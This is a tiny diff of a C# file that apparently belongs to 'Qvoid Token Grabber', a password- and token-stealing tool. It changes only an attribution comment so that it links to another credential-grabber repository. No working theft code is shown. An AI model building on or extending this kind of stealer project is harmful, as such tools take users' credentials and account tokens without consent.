@@ -10,7 +10,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-//Forked from some GitHub user which forked it too and added some functions, any way thx u saved me a lot <3.
+//https://github.com/bytixo/CockyGrabber thx u saved me a lot <3.
 
 namespace Qvoid_Token_Grabber.PasswordGrabbers
 {
